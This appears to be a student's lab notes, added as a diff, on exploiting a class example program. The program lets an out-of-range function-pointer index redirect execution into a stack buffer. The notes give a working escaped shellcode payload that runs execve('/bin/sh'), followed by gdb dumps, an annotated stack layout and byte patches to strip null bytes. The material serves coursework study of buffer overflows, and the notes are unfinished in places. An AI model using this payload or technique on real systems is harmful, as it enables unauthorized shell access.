@@ -1,0 +1,632 @@
+/-------------- your editor should be this wide ------------------------------------------------------/
+
+
+
+testy1.c notes
+
+This is code I had for a class.  The class used this program
+as an example of a buffer overflow.  The final part of the assignment was to 
+invoke the write_secret function. This is similar to what we did earlier,
+However, this code does not use a strcpy but instead uses a funciton pointer
+and read.  This is a good starting point for the next step since
+it can be more easily exploited to get a shell since it uses read instead
+of strcpy we can use assembly instructions which contains null bytes.  Null
+bytes will truncate string.  Furthermore the function call using a function
+pointer means it is preset to call a function.
+
+
+gdbit.sh and runbin.sh are used with testy1.c.  Edit the .gdbinit file to change
+options for use with this program as well.
+
+
+For simplicty I'm going to present an answer and then work backwards to show 
+how it works.
+
+Use screen and ssh to get two terminals on the vm.
+
+In one terminal issue this command to start the program.
+[davis@vm-i386 progs]$ ./runbin.sh 
+You should see a selection prompt with two choices, Receive wisdom and
+Add wisdom. Enter 2 to add some wisdom.  Type some text. "This is a test."
+When the menu reappears, enter 1 and it should echo back "This is a test."
+
+What's happening here is that when you enter a number, its an index into
+an array of function pointers.  The input is read with the read system call
+and it reads up to the full size of the buffer (minus 1 for a null) which is 1024 bytes.
+Afterwards, the program adds a nul byte to end of what's read in the buffer
+and then converts the ascii text to an int.  He uses the int to index into 
+an array of function pointers.
+
+Since the read buffer is large and on the stack, we are going to provide
+an initial number for the index in the function pointer.  We are going
+to index beyond the array of the function pointer array back into the
+buffer used for reading.  Then we will place code to get a shell inside
+this buffer.  
+
+So before we get to in depth, lets see the result get a shell and then we
+can disect it line for line.
+
+
+In another terminal issue this command to run gdb (Make sure you edit .gdbinit first)
+
+[davis@vm-i386 progs]$ ./gdbit.sh 
+
+
+This will start gdb in tui mode and connect to the process running the demo program.
+
+The reason we are running scripts instead of raw commands is:
+  o  We are going to pass a buffer with escape commands to generate bytecodes. 
+  o  The gdbit script is simply for convienence.
+
+So back to gdb. in gdb there should be a break set at line 107.  Since we are
+connecting to a running program it might attach during a point where we are
+not in our test code.  Simply type cont at the prompt to resume execution since
+gdb stops execution when it connects.
+
+(gdb) cont
+
+Switch back to the test code and use your mouse to paste the following text.  This is
+why its advantageous to run with ssh and not use the qemu console.
+
+771509060\x00\x00\x00AAAA\x2f\x62\x69\x6e\x2f\x73\x68\x00\x40\xf3\xff\xbf\x00\x00\x00\x00\xbb\x40\xf3\xff\xbf\xb9\x48\xf3\xff\xbf\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAA\x50\xf3\xff\xbf
+
+hit the enter key
+
+Switch back to gdb.  It shold be at a breakpoint using src debugging. ie. not asm.
+
+Step using next to determine the value of s.
+
+print the value of s
+(gdb) print /x s
+$1 = 0x2dfc4b44
+
+print it again in decimal
+(gdb) print  s
+$2 = 771509060
+
+Notice that is the first bytes of our buffer.  Notice these bytes are not escape codes.
+
+Dump the buffer using strings.  This will show ascii text in the buffer.  We can use
+this view to get addresses.
+
+(gdb) print buf
+$4 =   "771509060\000\000\000AAAA/bin/sh\000@\363\377\277\000\000\000\000\273@\363\377\277\271H\
+363\377\277\272\000\000\000\000\270\v\000\000\000̀AAAAAAAAAAP\363\377\277\n", '\000' <repeats 954
+ times>
+(gdb) 
+
+dump it again showing addresses
+
+(gdb) x/24s buf
+0xbffff330:     "771509060"
+0xbffff33a:     ""
+0xbffff33b:     ""
+0xbffff33c:     "AAAA/bin/sh"
+0xbffff348:     "@\363\377\277"
+0xbffff34d:     ""
+0xbffff34e:     ""
+0xbffff34f:     ""
+0xbffff350:     "\273@\363\377\277\271H\363\377\277\272"
+0xbffff35c:     ""
+0xbffff35d:     ""
+0xbffff35e:     ""
+0xbffff35f:     "\270\v"
+0xbffff362:     ""
+0xbffff363:     ""
+0xbffff364:     "̀AAAAAAAAAAP\363\377\277\n"
+0xbffff376:     ""
+0xbffff377:     ""
+0xbffff378:     ""
+0xbffff379:     ""
+0xbffff37a:     ""
+0xbffff37b:     ""
+0xbffff37c:     ""
+0xbffff37d:     ""
+
+So we dump way more than necessary with the 24 specifier.  You can see this because the AAAAAA
+markers show up and the second one is near the end of the buffer at address 0xbffff364.
+
+Dump it again using hex codes.
+
+(gdb) x/20xw buf
+0xbffff330:     0x35313737      0x36303930      0x00000030      0x41414141
+0xbffff340:     0x6e69622f      0x0068732f      0xbffff340      0x00000000
+0xbffff350:     0xfff340bb      0xf348b9bf      0x00babfff      0xb8000000
+0xbffff360:     0x0000000b      0x414180cd      0x41414141      0x41414141
+0xbffff370:     0xbffff350      0x0000000a      0x00000000      0x00000000
+
+
+Dump the function pointer array
+(gdb) x/4xw ptrs
+0x80ec660 <ptrs>:       0x00000000      0x080488ee      0x0804898e      0x00000d00
+
+From the code, we know 
+int fptr  ptrs[3] = { NULL, get_wisdom, put_wisdom };
+
+So we can assume the addresses in the ptrs dump correspond to the two functions listed 
+in the code.
+
+(gdb) disas get_wisdom, +10
+Dump of assembler code from 0x80488ee to 0x80488f8:
+   0x080488ee <get_wisdom+0>:   push   %ebp
+   0x080488ef <get_wisdom+1>:   mov    %esp,%ebp
+   0x080488f1 <get_wisdom+3>:   sub    $0x18,%esp
+   0x080488f4 <get_wisdom+6>:   movl   $0x77206f6e,-0x17(%ebp)
+End of assembler dump.
+
+and
+
+(gdb) disas put_wisdom, +10
+Dump of assembler code from 0x804898e to 0x8048998:
+   0x0804898e <put_wisdom+0>:   push   %ebp
+   0x0804898f <put_wisdom+1>:   mov    %esp,%ebp
+   0x08048991 <put_wisdom+3>:   push   %edi
+   0x08048992 <put_wisdom+4>:   sub    $0x94,%esp
+End of assembler dump.
+
+We can also do this like so:
+
+(gdb) disas ptrs[1], +10
+Dump of assembler code from 0x80488ee to 0x80488f8:
+   0x080488ee <get_wisdom+0>:   push   %ebp
+   0x080488ef <get_wisdom+1>:   mov    %esp,%ebp
+   0x080488f1 <get_wisdom+3>:   sub    $0x18,%esp
+   0x080488f4 <get_wisdom+6>:   movl   $0x77206f6e,-0x17(%ebp)
+End of assembler dump.
+
+Which makes sense.  Our index for s is not 1 or 2 though.  Its 771509060.
+So what is that address?
+
+(gdb) disas ptrs[771509060], +22
+Dump of assembler code from 0xbffff350 to 0xbffff366:
+   0xbffff350:  mov    $0xbffff340,%ebx
+   0xbffff355:  mov    $0xbffff348,%ecx
+   0xbffff35a:  mov    $0x0,%edx
+   0xbffff35f:  mov    $0xb,%eax
+   0xbffff364:  int    $0x80
+End of assembler dump.
+
+So that is our code to perform a sytemcall for doing execev to execute a shell.
+So where is this memory?
+
+(gdb) print /x $esp
+$7 = 0xbffff330
+
+So our top of stack is above this.  This means this is making sense.  The memory
+for the buf was pushed on the stack the shell code is higher in memory
+but nearby.  lets dump the stack and see how it lines up with what we have
+seen so far.
+
+So, I'm going to use a trick here to print the memory in a single column. Print memory
+the first time with a specified address with only one repeat and then print memory the 
+next time without a specified address.  The result is
+
+(gdb) x/x $esp
+0xbffff330:     0x35313737
+(gdb) x/x     
+0xbffff334:     0x36303930
+0xbffff338:     0x00000030
+0xbffff33c:     0x41414141
+0xbffff340:     0x6e69622f
+0xbffff344:     0x0068732f
+0xbffff348:     0xbffff340
+0xbffff34c:     0x00000000
+0xbffff350:     0xfff340bb
+0xbffff354:     0xf348b9bf
+0xbffff358:     0x00babfff
+0xbffff35c:     0xb8000000
+0xbffff360:     0x0000000b
+0xbffff364:     0x414180cd
+0xbffff368:     0x41414141
+0xbffff36c:     0x41414141
+0xbffff370:     0xbffff350
+
+So with the data from above I will annotate whats on the stack.
+
+
+0xbffff330:     0x35313737	<- top of stack.  Also the first byte of buf[]
+0xbffff334:     0x36303930	<- Our ptrs index 's' starts above and continues here ...
+0xbffff338:     0x00000030  <- and here where it ends with null terminating byte.
+0xbffff33c:     0x41414141	<- Our first marker in buf[]
+0xbffff340:     0x6e69622f  <- Our string for "/bin/sh" 0x2f is ascii for /
+0xbffff344:     0x0068732f	<- The last part of "/bin/sh" including null terminating byte.
+0xbffff348:     0xbffff340
+0xbffff34c:     0x00000000
+0xbffff350:     0xfff340bb 	<- where the ptr[s] points to. In other words, our new function.
+0xbffff354:     0xf348b9bf
+0xbffff358:     0x00babfff
+0xbffff35c:     0xb8000000
+0xbffff360:     0x0000000b
+0xbffff364:     0x414180cd 	<- our int80 is the last two bytes here. Ending our system call.
+0xbffff368:     0x41414141	<- Our second marker starts in word above in buf[] but is also here.
+0xbffff36c:     0x41414141	<- and here. Remember we can access memory in byte offsets.
+0xbffff370:     0xbffff350 	<- our hacked function pointer address ie. ptrs[s]
+
+FWIW, here is the ascii for "/bin/sh" in hex.
+(gdb) print /x "/bin/sh"
+$8 =   {[0x0] = 0x2f,
+  [0x1] = 0x62,
+  [0x2] = 0x69,
+  [0x3] = 0x6e,
+  [0x4] = 0x2f,
+  [0x5] = 0x73,
+  [0x6] = 0x68,
+  [0x7] = 0x0}
+
+FWIW, here is the ascii for our ptrs index. 
+(gdb) print /x "771509060"
+$9 =   {[0x0] = 0x37,
+  [0x1] = 0x37,
+  [0x2] = 0x31,
+  [0x3] = 0x35,
+  [0x4] = 0x30,
+  [0x5] = 0x39,
+  [0x6] = 0x30,
+  [0x7] = 0x36,
+  [0x8] = 0x30,
+  [0x9] = 0x0}
+
+To fill in the rest, I'm going to go  back to the code and continue below.  I'm also
+going to show how to do a system call. I'm going to show the commands to read the docs
+but cut out only the relevant portions.
+
+
+
+[davis@yoshi stage2]$ cat /usr/include/asm/unistd_32.h | grep exec
+#define __NR_execve 11
+
+This shows that exec is decimal 11.  
+
+[davis@yoshi stage2]$ man syscall
+<parts omitted>
+
+      arch/ABI   instruction          syscall #   retval Notes
+       ───────────────────────────────────────────────────────────────────
+       i386       int $0x80            eax         eax
+
+       arch/ABI      arg1  arg2  arg3  arg4  arg5  arg6  arg7  Notes
+       ──────────────────────────────────────────────────────────────────
+       i386          ebx   ecx   edx   esi   edi   ebp   -
+
+[davis@yoshi stage2]$ man 3 execve
+ASIDE: $ apropos exec 
+<parts omitted>
+
+           #include <unistd.h>
+
+           int ret;
+           char *cmd[] = { "ls", "-l", (char *)0 };
+           char *env[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
+           ...
+           ret = execve ("/bin/ls", cmd, env);
+
+
+
+(gdb) disas ptrs[771509060], +22
+Dump of assembler code from 0xbffff350 to 0xbffff366:
+   0xbffff350:  mov    $0xbffff340,%ebx
+   0xbffff355:  mov    $0xbffff348,%ecx
+   0xbffff35a:  mov    $0x0,%edx
+   0xbffff35f:  mov    $0xb,%eax
+   0xbffff364:  int    $0x80
+End of assembler dump.
+and
+(gdb) disas /r ptrs[771509060], +22
+Dump of assembler code from 0xbffff350 to 0xbffff366:
+   0xbffff350:  bb 40 f3 ff bf  mov    $0xbffff340,%ebx  ; ptr to "/bin/sh"
+   0xbffff355:  b9 48 f3 ff bf  mov    $0xbffff348,%ecx  ; ptr to cmd, with closing null pointer
+   0xbffff35a:  ba 00 00 00 00  mov    $0x0,%edx		; null ptr for env
+   0xbffff35f:  b8 0b 00 00 00  mov    $0xb,%eax
+   0xbffff364:  cd 80   int    $0x80
+End of assembler dump.
+
+
+0xbffff330:     0x35313737	<- top of stack.  Also the first byte of buf[]
+0xbffff334:     0x36303930	<- Our ptrs index 's' starts above and continues here ...
+0xbffff338:     0x00000030  <- and here where it ends with null terminating byte.
+0xbffff33c:     0x41414141	<- Our first marker in buf[]
+0xbffff340:     0x6e69622f  <- Our string for "/bin/sh" 0x2f is ascii for /
+0xbffff344:     0x0068732f	<- The last part of "/bin/sh" including null terminating byte.
+0xbffff348:     0xbffff340		<- our storage for cmd pointer
+0xbffff34c:     0x00000000		<- our null pointer cmd struct
+0xbffff350:     0xfff340bb 	<- where the ptr[s] points to. In other words, our new function.
+..				..				<- our "/bin/sh" ptr move as arg1 to ebx.
+0xbffff354:     0xf348b9bf  	<- at 55 offset is start of move of arg2 man page cmd arg.
+0xbffff358:     0x00babfff		<- at 5a offset is start of move of arg3 man page env arg which is null.
+0xbffff35c:     0xb8000000		<- at 5f offset is start of move of syscall number 11/0xb to eax
+0xbffff360:     0x0000000b		<- the actual 11/0xb
+0xbffff364:     0x414180cd 	<- our int80 is the last two bytes here. Ending our system call.
+0xbffff368:     0x41414141	<- Our second marker starts in word above in buf[] but is also here.
+0xbffff36c:     0x41414141	<- and here. Remember we can access memory in byte offsets.
+0xbffff370:     0xbffff350 	<- our hacked function pointer address ie. ptrs[s]
+
+
+Ok, so now lets look at the classic document from Aleph One paper
+http://insecure.org/stf/smashstack.html 
+
+About midway through the document there is a section on using different instructions so that
+we don't have nulls in our buffer which is the problem I mentioned earlier.
+
+So instead of a mov 0x0, we do an xor eax, eax to get a zero in eax.  then we mov
+this value to our destination.
+
+Rerun the code using existing buffer and stop at the point prior to executing the hacked 
+function pointer.  Sadly, gdb does not have an assemble command like dos debug, but
+we can get by patching the code once we know the opcodes.
+
+So open text file testy1.asm. It looks like this:
+
+xor eax, eax
+mov edx, eax
+
+Up to now, we have been using gdb which uses AT&T notation where its "operation src, dst"
+but nasm uses intel notation where its "operation dst, src".  Yes, we can change
+notation in gdb. Sadly I am used to gdb default.
+
+FWIW, you can use nasm on your host machine or vm.  Nasm can build for 32-bit or 64-bit with
+the -f mode switch.
+
+$ nasm -felf testy1a.asm
+
+That will assemble the code for 32-bit. And to see the byte codes, do 
+
+$ objdump -D testy1a.o
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:   31 c0                   xor    %eax,%eax
+   2:   89 c2                   mov    %eax,%edx
+
+And now we are back to AT&T syntax.  Yes, I know we can switch format.  I'm used 
+to the default.
+
+Go back to gdb and do this:
+
+(gdb) disas /r ptrs[s], +22
+set your bearings.
+
+(gdb) set var *((char *) 0xbffff35a) = 0x31
+(gdb) set var *((char *) 0xbffff35b) = 0xc0
+(gdb) set var *((char *) 0xbffff35c) = 0x89
+(gdb) set var *((char *) 0xbffff35d) = 0xd0
+(gdb) set var *((char *) 0xbffff35e) = 0x90
+(gdb) disas /r ptrs[s], +22
+Dump of assembler code from 0xbffff350 to 0xbffff366:
+   0xbffff350:  bb 40 f3 ff bf  mov    $0xbffff340,%ebx
+   0xbffff355:  b9 48 f3 ff bf  mov    $0xbffff348,%ecx
+   0xbffff35a:  31 c0   xor    %eax,%eax  
+   0xbffff35c:  89 c2   mov    %eax,%edx 
+   0xbffff35e:  90      nop
+   0xbffff35f:  b8 0b 00 00 00  mov    $0xb,%eax
+   0xbffff364:  cd 80   int    $0x80
+End of assembler dump.
+
+(I just realized I did the nop from memory.  I shed a slight tear, not an indian looking at trash 
+tear, but kind of a 4chan meme tear as I realized I'm about to watch the superbowl alone 
+but I know this kind of useless triva by heart. LOL)
+
+So same thing as before for the mov 0xb
+Take that back. Gonna do 
+(gdb) set var *((char *) 0xbffff35e) = 0x83
+(gdb) set var *((char *) 0xbffff35f) = 0xc0
+(gdb) set var *((char *) 0xbffff360) = 0xb
+(gdb) set var *((char *) 0xbffff361) = 0xcd
+(gdb) set var *((char *) 0xbffff362) = 0x80
+
+(gdb) disas /r ptrs[s], +22
+Dump of assembler code from 0xbffff350 to 0xbffff366:
+   0xbffff350:  bb 40 f3 ff bf  mov    $0xbffff340,%ebx
+   0xbffff355:  b9 48 f3 ff bf  mov    $0xbffff348,%ecx
+   0xbffff35a:  31 c0   xor    %eax,%eax  
+   0xbffff35c:  89 c2   mov    %eax,%edx 
+   0xbffff35e:  83 c0 0b        add    $0xb,%eax
+   0xbffff361:  cd 80   int    $0x80
+   0xbffff363:  00 cd   add    %cl,%ch
+   0xbffff365:  80 41 41 41     addb   $0x41,0x41(%ecx)
+End of assembler dump.
+
+Added some more nops and I have
+Dump of assembler code from 0xbffff350 to 0xbffff366:
+   0xbffff350:  bb 40 f3 ff bf  mov    $0xbffff340,%ebx
+   0xbffff355:  b9 48 f3 ff bf  mov    $0xbffff348,%ecx
+   0xbffff35a:  31 c0   xor    %eax,%eax  
+   0xbffff35c:  89 c2   mov    %eax,%edx 
+   0xbffff35e:  83 c0 0b        add    $0xb,%eax
+   0xbffff361:  cd 80   int    $0x80
+   0xbffff363:  90      nop
+   0xbffff364:  90      nop
+   0xbffff365:  80 41 41 41     addb   $0x41,0x41(%ecx)
+End of assembler dump.
+
+not that it matters
+
+but quick check of the memory
+
+(gdb) x/x $esp
+0xbffff330:     0x35313737
+0xbffff334:     0x36303930
+0xbffff338:     0x00000030
+0xbffff33c:     0x41414141
+0xbffff340:     0x6e69622f
+0xbffff344:     0x0068732f
+0xbffff348:     0xbffff340
+0xbffff34c:     0x00000000
+0xbffff350:     0xfff340bb
+0xbffff354:     0xf348b9bf
+0xbffff358:     0xc031bfff
+0xbffff35c:     0xc083c289
+0xbffff360:     0x9080cd0b
+0xbffff364:     0x41418090
+0xbffff368:     0x41414141
+0xbffff36c:     0x41414141
+0xbffff370:     0xbffff350
+
+Ok. I still see some 0x0's but lets see if it runs when I hit continue
+Yeap,...
+Continuing.
+process 484 is executing new program: /usr/bin/bash
+Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
+warning: Could not load shared library symbols for linux-gate.so.1.
+Do you need "set solib-search-path" or "set sysroot"?
+
+Going to stop now and watch game. bbl
+
+
+Resuming here.
+
+
+Also this is the summary mods we made at runtime.  Rather than do it again manually we can 
+save this to a cmd file for gdb.
+
+[davis@yoshi progs]$ cat patch.gdb 
+set var *((char *) 0xbffff35a) = 0x31
+set var *((char *) 0xbffff35b) = 0xc0
+set var *((char *) 0xbffff35c) = 0x89
+set var *((char *) 0xbffff35d) = 0xc2
+set var *((char *) 0xbffff35e) = 0x83
+set var *((char *) 0xbffff35f) = 0xc0
+set var *((char *) 0xbffff360) = 0xb
+set var *((char *) 0xbffff361) = 0xcd
+set var *((char *) 0xbffff362) = 0x80
+
+Restart our setup, next until tmp() call.
+I can't do a disas of tmp or ptrs[s] since our code in the stack is not in the
+elf sections.  They can be added.  See aleph one doc on how to fix this.  Instead
+just do this:
+
+(gdb) print ptrs[s]
+$3 = (fptr) 0xbffff350
+(gdb) disas 0xbffff350, +22
+Dump of assembler code from 0xbffff350 to 0xbffff366:
+   0xbffff350:  mov    $0xbffff340,%ebx
+   0xbffff355:  mov    $0xbffff348,%ecx
+   0xbffff35a:  mov    $0x0,%edx
+   0xbffff35f:  mov    $0xb,%eax
+   0xbffff364:  int    $0x80
+End of assembler dump.
+(gdb) 
+
+patch the code with the stuff we did earlier.
+(gdb) source patch.gdb
+(gdb) disas 0xbffff350, +22
+Dump of assembler code from 0xbffff350 to 0xbffff366:
+   0xbffff350:  mov    $0xbffff340,%ebx
+   0xbffff355:  mov    $0xbffff348,%ecx
+   0xbffff35a:  xor    %eax,%eax
+   0xbffff35c:  mov    %edx,%eax  <-------- error. edx is dest
+   0xbffff35e:  add    $0xb,%eax
+   0xbffff361:  int    $0x80
+   0xbffff363:  add    %cl,%ch
+   0xbffff365:  addb   $0x41,0x41(%ecx)
+End of assembler dump.
+
+Now we are back to where we left off.
+
+So the next problem is that our code has some remaining zeros in our buffer.
+
+(gdb) source patch.gdb
+(gdb) x/20xw buf
+0xbffff330:     0x35313737      0x36303930      0x00000030      0x41414141
+0xbffff340:     0x6e69622f      0x0068732f      0xbffff340      0x00000000
+0xbffff350:     0xfff340bb      0xf348b9bf      0xc031bfff      0xc083d089
+0xbffff360:     0x0080cd0b      0x414180cd      0x41414141      0x41414141
+0xbffff370:     0xbffff350      0x0000000a      0x00000000      0x00000000
+
+Namely, we have 0x00000030 word and the 0x00000000 word.  We also have two bytes
+which are zero.  Let's address the words first.
+
+The first zero is  the null term for the ptr index.  We can't get rid of that once
+since its the mechanism we are depending upon to build a shell.  Don't dispair.  We
+are only using this code to show how to build shell code for the strcpy overflow.
+
+The second zero is the null pointer for our execve call.  That can be fixed by
+relocating the strings to be at the end of the buffer.  So let's do that part next.
+
+So in summary this is what we have:
+
+(gdb) x/1xw buf
+0xbffff330:     0x35313737	<- Function pointer index to >-----------\
+0xbffff334:     0x36303930								 	          |
+0xbffff338:     0x00000030	<- null required for prog src.	          |
+0xbffff33c:     0x41414141									          |
+0xbffff340: /-> 0x6e69622f <--------------------------------------\   |
+0xbffff344: |   0x0068732f									       |  |
+0xbffff348: \-< 0xbffff340 <---------------------------------------+  |
+0xbffff34c:     0x00000000 <- Null pointer for exec                |  |
+0xbffff350:     0xfff340bb <- Start of our code. Use buffs here >-/   |
+0xbffff354:     0xf348b9bf									          |
+0xbffff358:     0xc031bfff									          |
+0xbffff35c:     0xc083d089									          |
+0xbffff360:     0x0080cd0b									          |
+0xbffff364:     0x414180cd									          |
+0xbffff368:     0x41414141									          |
+0xbffff36c:     0x41414141									          |
+0xbffff370:     0xbffff350 <- Funciton pointer to our code <---------/
+
+
+So the desired goal is move those buffer to end. markers are put in the
+unused spots left behind.
+
+
+0xbffff330:     0x35313737	<- Function pointer index to >-----------\
+0xbffff334:     0x36303930								 	          |
+0xbffff338:     0x00000030	<- null required for prog src.	          |
+0xbffff33c:     0x41414141  <- markers                                |
+0xbffff340:     0x42424242                                            |
+0xbffff344:     0x43434343									          |
+0xbffff348:     0x44444444                                            |
+0xbffff34c:     0x45454545                                            |
+0xbffff350:     0xfff340bb <- Start of our code. Use buffs here >--\  |
+0xbffff354:     0xf348b9bf									       |  |
+0xbffff358:     0xc031bfff									       |  |
+0xbffff35c:     0xc083d089									       |  |
+0xbffff360:     0x0080cd0b									       |  |
+0xbffff364:     0x414180cd									       |  |
+0xbffff368:     0x41414141									       |  |
+0xbffff36c:     0x41414141									       |  |
+0xbffff370:     0xbffff350 <- Funciton pointer to our code <-------|-/
+0xbffff374:     0x6e69622f <---------------------------------------+  
+0xbffff378:     0x0068732f									       |  
+0xbffff37c:     0xbffff340 <---------------------------------------/  
+0xbffff380:     0x00000000 <- Null pointer for exec                   
+
+So, now our patch file has additional lines in it.  So, now the patch file looks like this
+
+<show patch.gdb step 2>
+
+So our initial zeros are gone
+
+But our address are wrong
+
+So patch those
+
+<sthow patch.gdb step 3>
+
+
+
+Results in 
+(gdb) source patch.gdb
+(gdb) disas 0xbffff350, +22
+Dump of assembler code from 0xbffff350 to 0xbffff366:
+   0xbffff350:  mov    $0xbffff374,%ebx
+   0xbffff355:  mov    $0xbffff37c,%ecx
+   0xbffff35a:  xor    %eax,%eax
+   0xbffff35c:  mov    %eax,%edx
+   0xbffff35e:  add    $0xb,%eax
+   0xbffff361:  int    $0x80
+   0xbffff363:  add    %cl,%ch
+   0xbffff365:  addb   $0x41,0x41(%ecx)
+End of assembler dump.
+(gdb) 
+
+(gdb) x/1xw 0xbffff374
+0xbffff374:     0x6e69622f
+0xbffff378:     0x0068732f
+0xbffff37c:     0xbffff374
+0xbffff380:     0x00000000
+
+
+
+
+
+
